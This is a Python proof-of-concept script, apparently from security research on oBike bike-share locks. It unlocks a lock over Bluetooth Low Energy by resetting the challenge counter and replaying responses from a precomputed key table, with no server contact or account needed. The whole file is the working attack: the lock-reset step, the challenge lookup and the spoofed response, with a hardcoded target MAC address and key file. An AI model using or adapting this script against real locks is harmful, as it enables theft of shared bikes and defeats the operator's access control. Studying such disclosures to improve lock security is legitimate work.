#!/usr/bin/env python
# -*- coding: utf-8 -*-

"""Demo 2: unlock oBike by resetting the milliseconds counter
and replaying a key from a lookup table; requires neither interaction
with the oBike servers nor a valid account.
"""

from bluepy.btle import Scanner, DefaultDelegate
from obike.ble_client import BleClient
from obike.http_client import HttpClient
from colorama import Fore, Back, Style
import json
import csv
import time
import struct
import argparse
import traceback

keyfile = 'keys/keys_63_1.txt'
macaddr = 'd4:36:39:b8:78:2f'


def read_keys(keyfile):
    with open(keyfile, 'r') as f:
        reader = csv.reader(f)
        keys = dict()
        for row in reader:
            keys[row[0]] = row
        return keys


def unlock_bike(mac, keys, iface=0):
    c = BleClient(mac)
    c.connect()

    # reset the challenge milliseconds counter
    c.reset()

    time.sleep(2)

    c.connect()

    # [1] say hello to lock
    res = c.get_lock_record()

    # [2] receive challenge
    challenge = c.get_challenge()['challenge']
    print "Challenge: %s" % challenge

    # look up response
    row = keys[challenge.lower()]

    # [5] send response to lock
    c.send_response(int(row[1]), int(row[3])/1000, row[2].decode('hex'))

    # [6] TODO get acknowledgement from lock
    # [7] TODO send acknowledgement to obike server

    # kthxbye
    c.disconnect()


parser = argparse.ArgumentParser(
    prog='unlock02.py', formatter_class=argparse.ArgumentDefaultsHelpFormatter)
parser.add_argument('-i', '--iface', help='hci interface number',
                    type=int, default=0)
parser.add_argument('-m', '--macaddr', help='The mac address of the obike',
                    default=macaddr)
parser.add_argument('-k', '--keyfile', help='The lookup table',
                    default=keyfile)
args = parser.parse_args()
print "[+] using iface: ", args.iface
print "[+] using macaddr ", args.macaddr
print "[+] using keyfile ", args.keyfile

print "[+] reading keys..."
keys = read_keys(args.keyfile)
try:
    unlock_bike(args.macaddr, keys, args.iface)
except Exception as ex:
    print Fore.MAGENTA + Style.BRIGHT + "Error occured, aborting.\n" + \
        traceback.format_exc() + Style.RESET_ALL
